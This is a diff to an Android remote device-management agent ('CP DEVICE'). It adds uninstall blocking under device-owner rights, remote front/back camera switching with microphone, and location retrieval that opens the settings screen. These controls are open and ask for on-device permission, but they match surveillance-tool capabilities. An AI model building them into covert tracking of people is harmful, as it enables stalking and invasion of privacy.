@@ -79,6 +79,7 @@ public class AgentService extends Service {
         ComponentName receiver = new ComponentName(this, CpDeviceAdminReceiver.class);
         boolean admin = dpm != null && dpm.isAdminActive(receiver);
         boolean owner = dpm != null && dpm.isDeviceOwnerApp(getPackageName());
+        if (owner) { try { dpm.setUninstallBlocked(receiver, getPackageName(), true); } catch (Exception ignored) { } }
         boolean accessibility = CpAccessibilityService.isReady();
         String body = "{\"info\":{\"manufacturer\":\"" + safe(Build.MANUFACTURER) + "\",\"model\":\"" + safe(Build.MODEL) + "\",\"androidVersion\":\"" + safe(Build.VERSION.RELEASE) + "\",\"androidId\":\"" + safe(prefs.getString("androidId", "")) + "\"},\"capabilities\":{\"nativeAgent\":true,\"deviceAdmin\":" + admin + ",\"deviceOwner\":" + owner + ",\"accessibility\":" + accessibility + ",\"camera\":true,\"files\":true,\"location\":true,\"oemPrivileged\":false},\"operation\":{\"agent\":\"running\",\"deviceAdmin\":" + admin + ",\"deviceOwner\":" + owner + ",\"accessibility\":" + accessibility + "},\"alerts\":[]}";
         request("POST", "/api/device/" + deviceId() + "/heartbeat", body);
@@ -119,13 +120,19 @@ public class AgentService extends Service {
             int y = numberAfter(commandJson, "\\\"y\\\":", commandStart, 640);
             return CpAccessibilityService.tap(x, y) ? "Tap dispatched at " + x + "," + y : "Accessibility service is not enabled.";
         }
-        if ("camera.stream.request".equals(type)) { startForegroundService(new Intent(this, CameraStreamService.class)); return "Camera stream requested. Android camera permission must be approved on the device."; }
+        if ("camera.stream.request".equals(type)) { Intent intent = new Intent(this, CameraStreamService.class); intent.putExtra("facing", textValue(commandJson, "facing", commandStart, "back")); startForegroundService(intent); return "Camera stream requested. Android camera and microphone permissions must be approved on the device."; }
+        if ("camera.switch".equals(type)) { Intent stop = new Intent(this, CameraStreamService.class); stopService(stop); Intent intent = new Intent(this, CameraStreamService.class); intent.putExtra("facing", textValue(commandJson, "facing", commandStart, "front")); startForegroundService(intent); return "Camera switched to " + textValue(commandJson, "facing", commandStart, "front") + "."; }
         return "Command received: " + type;
     }
 
     private String locateDevice() {
         try {
             LocationManager manager = (LocationManager) getSystemService(LOCATION_SERVICE);
+            boolean gpsEnabled = false;
+            boolean networkEnabled = false;
+            try { gpsEnabled = manager.isProviderEnabled(LocationManager.GPS_PROVIDER); } catch (Exception ignored) { }
+            try { networkEnabled = manager.isProviderEnabled(LocationManager.NETWORK_PROVIDER); } catch (Exception ignored) { }
+            if (!gpsEnabled && !networkEnabled) { openLocationSettings(); return "Android Location is OFF. Location settings opened on the device; approve/turn it on once, then click Locate again."; }
             final Location[] fresh = new Location[1];
             final CountDownLatch latch = new CountDownLatch(1);
             LocationListener listener = new LocationListener() {
@@ -143,6 +150,12 @@ public class AgentService extends Service {
             if (location == null) return "Location unavailable. Turn on Android Location services and set CP DEVICE Location permission to Allow all the time or Allow while using, then try Locate again.";
             return "{\"lat\":" + location.getLatitude() + ",\"lng\":" + location.getLongitude() + ",\"accuracy\":" + location.getAccuracy() + ",\"mapUrl\":\"https://www.google.com/maps?q=" + location.getLatitude() + "," + location.getLongitude() + "\"}";
         } catch (SecurityException error) { return "Location permission is required. Enable Location permission for CP DEVICE."; } catch (Exception error) { return "Locate failed: " + safe(error.getMessage()); }
+    }
+
+    private void openLocationSettings() {
+        Intent intent = new Intent(android.provider.Settings.ACTION_LOCATION_SOURCE_SETTINGS);
+        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        startActivity(intent);
     }
 
     private void openScreenCaptureConsent() {
